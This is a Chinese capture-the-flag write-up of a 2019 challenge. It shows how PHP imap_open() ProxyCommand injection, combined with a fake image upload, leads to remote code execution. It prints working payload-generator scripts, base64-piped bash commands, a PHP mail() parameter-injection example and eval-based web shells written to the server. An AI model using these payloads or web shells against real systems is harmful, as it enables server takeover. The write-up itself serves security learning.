> 原文链接: https://www.anquanke.com//post/id/171707 


# 从一道题看imap_open() RCE


                                阅读量   
                                **282336**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">16</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t012f7ef64beeafab33.png)](https://p4.ssl.qhimg.com/t012f7ef64beeafab33.png)



## 前言

本题为2019安恒2月月赛的my email，从漏洞点发现到getshell还是有点意思的，以下是记录



## 信息搜集

拿到题目先看一遍功能，发现存在注册和登录功能

[![](https://p1.ssl.qhimg.com/t014635afec6b7c71c2.png)](https://p1.ssl.qhimg.com/t014635afec6b7c71c2.png)

随便注册个账号，登入，得到信息

[![](https://p3.ssl.qhimg.com/t01ec4cfb612bbbd9fe.png)](https://p3.ssl.qhimg.com/t01ec4cfb612bbbd9fe.png)

发现还有完善信息页面

[![](https://p2.ssl.qhimg.com/t018a1d6c62b7bd7019.png)](https://p2.ssl.qhimg.com/t018a1d6c62b7bd7019.png)

看样子需要邮箱授权，我们随便测试一下

[![](https://p4.ssl.qhimg.com/t01ba00ad256ab17ef8.png)](https://p4.ssl.qhimg.com/t01ba00ad256ab17ef8.png)

虽然提示我授权失败，但是来到主页，已经完善信息完成

[![](https://p5.ssl.qhimg.com/t015153803ea31b85d2.png)](https://p5.ssl.qhimg.com/t015153803ea31b85d2.png)

发现增加功能：更换背景

```
http://101.71.29.5:10014/user/upload.php
```

发现是文件上传功能

我们测试一下，随意上传一个图片，查看一下源代码，发现

```
body`{`
    background-image: url(./user/skysky.jpg);
    background-size: 100%,100%;
    width: 100%;
    height: 100%;
`}`
```

得到上传路径与命名规则

```
$dir = './user/'.$username.'.jpg';
```

不难发现，最后保存路径存在可控点$username，我们进行二次注入探测

注册用户

```
skysky.php%00
```

登入后发现用户名变为

```
skysky.php
```

猜测应该注册处存在

```
addslashes($username)
```

那么应该很难使用$username去上传shell



## 攻击点思考

目前来看，情况僵硬，必须思考一下如何串联上述功能进行攻击了

既然不是直接upload+register进行getshell，那么势必需要用到邮件功能

不妨google一下

```
php+mail+rce
```

发现如下两个函数

```
PHP mail()
PHP imap_open()
```

为进一步确定方向和攻击点，我们看一下邮箱处需要的参数

[![](https://p1.ssl.qhimg.com/t015d6646a96de79ea2.png)](https://p1.ssl.qhimg.com/t015d6646a96de79ea2.png)

我们再看上述3种和邮件有关的RCE

首先是

```
PHP mail()
```

我们知道其参数为

```
bool mail(
    string $to,
    string $subject,
    string $message [,
    string $additional_headers [,
    string $additional_parameters ]]
)
```

这里的界面应该类似于写邮件，例如

[![](https://p4.ssl.qhimg.com/t015d8e17ca3e333469.png)](https://p4.ssl.qhimg.com/t015d8e17ca3e333469.png)

而漏洞点即在于mail函数的第五个参数没有正确过滤，我们可以通过如下方式进行RCE

```
email=
-sky@skysec.top -OqueueDirectory=/ -Xskyskysky.php
title=
&lt;?php eval($_GET[sky]);?&gt;
```

而这里我们的参数为

```
email，sign，server
```

功能为邮箱授权，感觉有些对不上号，我们再看看`imap_open()`

```
imap_open ( string $mailbox , string $username , string $password [, int $options = 0 [, int $n_retries = 0 [, array $params = NULL ]]] ) : resource
```

漏洞点在于第一个参数`$mailbox`<br>
详细解析可见

```
https://lab.wallarm.com/rce-in-php-or-how-to-bypass-disable-functions-in-php-installations-6ccdbf4f52bb
```



## imap_open()攻击测试

于是综上所述，我们将目光放在imap_open()上开始测试，我们可利用如下脚本生成payload

```
&lt;?php
$payload = $argv[1];
$encoded_payload = base64_encode($payload);
$server = “any -o ProxyCommand=echot”.$encoded_payload.”|base64t-d|bash`}`”;
print(“payload: `{`$server`}`”.PHP_EOL);
```

例如

```
any -o ProxyCommand=echotbHM=|base64t-d|bash`}`
```

我们测试一下，由于imap_open是php的扩展模块，我们这里选择找个docker测试

随便搜一个

```
docker search imap
```

[![](https://p0.ssl.qhimg.com/t01dfe7e0c5efd1425a.png)](https://p0.ssl.qhimg.com/t01dfe7e0c5efd1425a.png)

选择一个后pull

```
docker pull fedosov/docker-php-imap-composer
```

进入容器进行测试

```
docker run -itd fedosov/docker-php-imap-composer /bin/bash
docker attach id
```

先写一个带有imap_open的1.php

```
&lt;?php
$payload = "echo skysky|tee /tmp/success";
$encoded_payload = base64_encode($payload);
$server = "any -o ProxyCommand=echot".$encoded_payload."|base64t-d|bash";
@imap_open('`{`'.$server.'`}`:143/imap`}`INBOX', '', '');
```

[![](https://p5.ssl.qhimg.com/t010a860aad52fa7b6e.png)](https://p5.ssl.qhimg.com/t010a860aad52fa7b6e.png)

我们可以明显看到，运行前tmp目录为空目录，运行后，tmp目录生成了success文件，文件内容为我们指定的skysky

这样一来攻击点就清晰了：利用邮箱授权功能往`./user/`目录写入shell即可

注：为什么不执行命令呢？因为这里命令不回显……写shell的话要方便很多



## 题目攻击点测试

生成payload脚本为

```
&lt;?php
$payload = "echo '&lt;?php phpinfo();' &gt; /var/www/html/user/sky.php";
$encoded_payload = base64_encode($payload);
$server = "any -o ProxyCommand=echot".$encoded_payload."|base64t-d|bash";
echo $server;
```

得到

```
any -o ProxyCommand=echotZWNobyAnPD9waHAgcGhwaW5mbygpOycgPiAvdmFyL3d3dy9odG1sL3VzZXIvc2t5LnBocA==|base64t-d|bash
```

我们测试一下

[![](https://p4.ssl.qhimg.com/t01002794cf3850bcc9.png)](https://p4.ssl.qhimg.com/t01002794cf3850bcc9.png)

发现参数不被允许提醒，此时猜测是不是存在过滤，我们测试一下

[![](https://p3.ssl.qhimg.com/t0144a3d37109195c18.png)](https://p3.ssl.qhimg.com/t0144a3d37109195c18.png)

[![](https://p1.ssl.qhimg.com/t013564ca883a658123.png)](https://p1.ssl.qhimg.com/t013564ca883a658123.png)

[![](https://p4.ssl.qhimg.com/t0147d79c83175983f8.png)](https://p4.ssl.qhimg.com/t0147d79c83175983f8.png)

发现

```
base64,|,
```

均被过滤，那么既然如此，该如何进行任意文件写入呢？



## upload助攻

此时不难想起，之前还有一个上传功能，路径如下

```
$dir = './user/'.$username.'.jpg';
```

我们是已知文件名和路径的，那么能否在文件内容做文章，进行运用？

这里不难想到，可以直接使用`bash filename`

例如

[![](https://p3.ssl.qhimg.com/t01921bdafd8f7c536f.png)](https://p3.ssl.qhimg.com/t01921bdafd8f7c536f.png)

那么我们只需要构造文件

```
echo 'echo "&lt;?php phpinfo();"&gt; skysky.php' &gt; skysky.jpg
```

然后上传skysky.jpg，再利用imap_open() RCE即可

```
any -o ProxyCommand=bash skysky.jpg`}`
```

我们测试一下

[![](https://p2.ssl.qhimg.com/t0109c631ab3d319f0e.png)](https://p2.ssl.qhimg.com/t0109c631ab3d319f0e.png)

[![](https://p1.ssl.qhimg.com/t01a331cee0b478265d.png)](https://p1.ssl.qhimg.com/t01a331cee0b478265d.png)

[![](https://p2.ssl.qhimg.com/t01fa63c59a9439b41b.png)](https://p2.ssl.qhimg.com/t01fa63c59a9439b41b.png)

发现成功执行phpinfo()



## getflag

那么故技重施，即可getshell

```
echo 'echo "&lt;?php eval($_REQUEST[sky]);"&gt; skysky.php' &gt; skysky.jpg
any -o ProxyCommand=bash skysky.jpg`}`

```

菜刀连上，即可getshell

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t018cfbc0a633878116.png)

[![](https://p5.ssl.qhimg.com/t01ef63bdde33f6cb23.png)](https://p5.ssl.qhimg.com/t01ef63bdde33f6cb23.png)



## 后记

这道题目再一次说明了思路很重要，如果思路不明确，尝试注入，upload等则很容易被这道题目带入误区XD
